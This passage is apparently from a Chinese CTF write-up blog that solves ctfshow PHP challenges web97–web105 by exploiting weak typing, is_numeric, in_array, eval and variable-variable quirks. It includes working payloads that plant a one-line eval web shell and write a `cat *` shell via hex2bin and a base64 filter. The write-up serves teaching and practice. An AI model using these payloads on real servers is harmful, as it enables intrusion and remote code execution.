class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>审计代码，需要post传两个参数，a和b。a和b的值不能相同，但是它们经过md5函数后必须严格相等。</p>
<p>PHP的md5()没法处理数组，所以直接传两个数组进去，就是null&#x3D;&#x3D;&#x3D;null。</p>
<p>post传a[]&#x3D;1&amp;b[]&#x3D;2即可。</p>
<h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>这段代码很乱，有点看不懂，一句句分着来看。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>代码1：如果传入get参数，则get参数变成post的参数。</p>
<blockquote>
<p>php中取值运算符”&amp;”表示引用，比如$b&#x3D;&amp;$a表示变量b是变量a的一个引用，相当于同一个变量两个名字，一个变化另一个也跟着变化。通常的赋值语句$b&#x3D;$a相当于copy了一个a的副本给b，b变化a不变化。取址就相当于把根刨了。<a target="_blank" rel="noopener" href="https://www.cnblogs.com/crazysong11/p/16251276.html">解释来自这个wp</a><br>?运算符是三元运算符，也称为条件运算符。它的语法是expr1 ? expr2 : expr3，其中expr1是一个条件表达式，如果它的值为true，则返回expr2的值，否则返回expr3的值。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>代码2：如果get参数的flag参数为“flag”，则get参数变为cookie的参数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>代码3：如果get参数的flag参数为“flag”，则get参数变为server的参数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>代码4：如果get参数的HTTP_FLAG参数为“flag”，则返回$flag变量为名的文件，否则高亮本身的文件。</p>
<p>那么由代码4，首先就需要放一个HTTP_FLAG参数，为flag。然后，因为有代码1，所以需要在POST放一个HTTP_FLAG参数，其值为flag。在经过代码1后，代码2和代码3就基本没作用了。所以最后是同时GET和POST HTTP_FLAG&#x3D;flag这个参数。</p>
<h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先创建了一个allow参数，其为一个数组，然后使用array_push做了从36到0x36D的循环，每次循环中都会推入一个随机值。</p>
<p>之后，会接收一个get参数n，使用in_array()函数对n进行检查，如果n在array中，则返回true。当if条件为真时，就将post请求中的content参数写入文件名为n的文件中。</p>
<p>in_array(search,array,type)函数有三个参数，前两个参数是必须的，search为搜索词，array为搜索数组；第三个参数被设置为true时，会检查search的类型是否和array中元素的类型相同，这个参数默认为false。</p>
<p>但是in_array()函数存在漏洞：在没有设置第三个参数的情况下（默认为false），就可以形成自动转换。在弱类型比较中，字符串会被转换成int，所以，如果n&#x3D;1.php，就会自动被转换为1。所以，只需要传入一个7shell.php，post的参数内容为一句话木马即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?n=7shell.php</span><br><span class="line"></span><br><span class="line">--post--</span><br><span class="line">content=&lt;?php @eval($_GET[&#x27;a&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>然后访问&#x2F;7shell.php，即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/7shell.php?a=phpinfo();</span><br></pre></td></tr></table></figure>
<h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一眼考is_numeric()的漏洞。</p>
<p>is_numeric()对于空字符，即%00，不论其放在前后都会被判定为非数值；而%20空格字符则只能放在数值后。而且对0x开头的十六进制数也会判断成数字。</p>
<p>我在想该如何让v0变成true，但是看wp发现，只要让v2和v3全是false，v1是true就可以让v0是false了。那么就可以直接var_dump()把$ctfshow变量dump出来。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=21&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;</span><br></pre></td></tr></table></figure>

<h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有头绪，看<a target="_blank" rel="noopener" href="https://blog.csdn.net/l2872253606/article/details/125173781">wp</a>,首先观察到这里没有过滤空格，似乎是用反射类。</p>
<p>payload为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=echo new Reflectionclass&amp;v3=;</span><br></pre></td></tr></table></figure>

<p>这样拼接后就成了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo new Reflectionclass(&#x27;ctfshow&#x27;);&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>可以返回ctfshow类的所有属性，其中一个属性名就是flag。</p>
<p>PHP的反射类是什么？</p>
<blockquote>
<p>PHP的反射机制提供了一套反射API，用来访问和使用类、方法、属性、参数和注释等，比如可以通过一个对象知道这个对象所属的类，这个类包含哪些方法，这些方法需要传入什么参数，每个参数是什么类型等等，不用创建类的实例也可以访问类的成员和方法，就算类成员定义为 private 也可以在外部访问。<br>官方文档提供了诸如 ReflectionClass、ReflectionMethod、ReflectionObject、ReflectionExtension 等反射类及相应的API，用得最多的是 ReflectionClass。</p>
</blockquote>
<p>搭个简单的示例代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$UserName</span> = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Pass</span> = <span class="string">&quot;adf&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Uf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; UserName = <span class="string">&quot;321&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; Pass = <span class="string">&quot;fda&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$reflection</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$reflection</span>;</span><br></pre></td></tr></table></figure>
<p>返回结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Class [ &lt;user&gt; <span class="class"><span class="keyword">class</span> <span class="title">User</span> ] </span>&#123;</span><br><span class="line">  @@ test.php <span class="number">2</span>-<span class="number">9</span></span><br><span class="line"></span><br><span class="line">  - Constants [<span class="number">0</span>] &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  - Static properties [<span class="number">0</span>] &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  - Static methods [<span class="number">0</span>] &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  - Properties [<span class="number">2</span>] &#123;</span><br><span class="line">    Property [ &lt;<span class="keyword">default</span>&gt; <span class="keyword">public</span> <span class="variable">$UserName</span> ]</span><br><span class="line">    Property [ &lt;<span class="keyword">default</span>&gt; <span class="keyword">private</span> <span class="variable">$Pass</span> ]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  - Methods [<span class="number">1</span>] &#123;</span><br><span class="line">    Method [ &lt;user&gt; <span class="keyword">public</span> method Uf ] &#123;</span><br><span class="line">      test.php <span class="number">5</span> - <span class="number">8</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>); <span class="comment">//截取$v2第二个字符后的所有字符</span></span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>); <span class="comment">//调用名称为$v1的函数，参数为$s</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>; </span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>); <span class="comment">//将$str内容写入名为$v3的文件中</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接看<a target="_blank" rel="noopener" href="https://blog.csdn.net/akxnxbshai/article/details/122696507">wp</a>。</p>
<p>substr(string,start,length)。其中string和start是必选，string是字符串，start是规定在字符串的哪里开始，length是可选，规定被返回字符串的长度，默认是直到字符串的结尾。</p>
<p>call_user_func(callable $callback, mixed …$args): mixed。第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</p>
<p><strong>php5下is_numeric可识别16进制，如0x2e，然后调用hex2bin转成字符串写入木马，但题目是php7,所以要另换方法。</strong></p>
<p>Exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&lt;?=`cat *`; &#x27;</span>; <span class="comment">//注意：存在一个空格，这样转base64的时候才不会出现abcd这四个字母导致没法变成纯数字。e这个字母被视作科学计数法，所以可以使用。</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>; <span class="comment">//5044383959474e686443417159447367</span></span><br></pre></td></tr></table></figure>

<p>所以可以构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?v2=115044383959474e686443417159447367&amp;v3=php://filter/write=convert.base64-decode/resource=2.php</span><br><span class="line">POST</span><br><span class="line">v1=hex2bin</span><br></pre></td></tr></table></figure>

<p>首先，需要在v2的前面加两个数字，这里加的是11；为什么不能直接把v3&#x3D;2.php？因为写入的是base64，需要用php伪协议处理一下。最后POST一个hex2bin。</p>
<p>这样，我们的v2首先把s变成5044383959474e686443417159447367，s再被v1的hex2bin执行变为PD89YGNhdCAqYDsg，然后v3在写入时有个base64解码的操作，就变成了cat *的代码。</p>
<h2 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*p.*h.*p.*/i&quot;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这题和上题一样，但是v2的原始字符串不让有php三个字母了。但是上面的原始字符串用php短标签，就没有php三个字母，所以可以直接复用上面的payload。</p>
<h2 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h2><p>SHA1绕过？</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>POST一个v1，GET一个v2，v1等于v2即可，那v1和v2传同样的字符串就行</p>
<p>也可以用PHP特性，这两个字符串sha1后是0e开头，松散比较会直接当成两个数字0。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aaK1STfY</span><br><span class="line">0e76658526655756207688271159624026011393</span><br><span class="line">aaO8zKZF</span><br><span class="line">0e89257456677279068558073954252716165668</span><br></pre></td></tr></table></figure>

<h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>; <span class="comment">// 设置一个变量，名称为$key； 其变量的值为以$value的值为变量名的变量值</span></span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>; <span class="comment">// 设置一个变量，名称为$key； 其变量的值为以$value的值为变量名的变量值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br></pre></td></tr></table></figure>
<p>里面出现了两个<code>$</code>符号的情况。这个叫PHP可变变量名。这让一个变量的变量名可以动态设置和使用。</p>
<p>对这道题来说，就是需要“变量覆盖”，看<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62094846/article/details/122529362">wp</a>说是有两种方法。其一是通过error&#x3D;flag，通过if不满足来替换error。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">?x=flag</span><br><span class="line"> </span><br><span class="line">POST</span><br><span class="line">error=x</span><br></pre></td></tr></table></figure>
